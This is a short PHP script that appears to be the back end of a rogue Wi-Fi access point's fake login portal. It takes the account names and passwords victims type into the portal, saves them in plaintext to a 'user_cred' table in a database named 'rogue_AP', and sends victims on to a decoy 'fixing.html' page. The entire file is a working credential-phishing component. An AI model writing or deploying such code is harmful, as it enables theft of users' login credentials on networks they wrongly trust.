<?php

// phpinfo();

if (isset($_POST['submit'])) {

    $host = "localhost";
    $db_username = "fakeap";
    $db_pass = "fakeap";
    $dbname = "rogue_AP";
    $tbl_name="user_cred";

    // Create connection
    $conn = mysqli_connect($host, $db_username, $db_pass, $dbname);

    // Check connection
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
        // echo "Error: Unable to connect to MySQL." . PHP_EOL;
        // echo "Debugging errno: " . mysqli_connect_errno() . PHP_EOL;
        // echo "Debugging error: " . mysqli_connect_error() . PHP_EOL;
        // exit;
    }

    // Check the input value
    if (!empty($_POST['account']) && !empty($_POST['password'])) {
        $account = mysqli_real_escape_string($conn, $_POST['account']);
        $password = mysqli_real_escape_string($conn, $_POST['password']);

        // Edit the SQLDatabase

        // mysqli_query($conn, "SELECT * FROM user_cred");

        $sql = "INSERT INTO user_cred (account, password) VALUES ('$account', '$password')";
        
        if (mysqli_query($conn, $sql)) {
            echo "New record created successfully";
        } else {
            echo "Error: " . $sql . "<br>" . mysqli_error($conn);
        }

        // Close the connection
        mysqli_close($conn);
    }

    // Handling Redirection Process
    header("Location: fixing.html");
    die();
}
?>
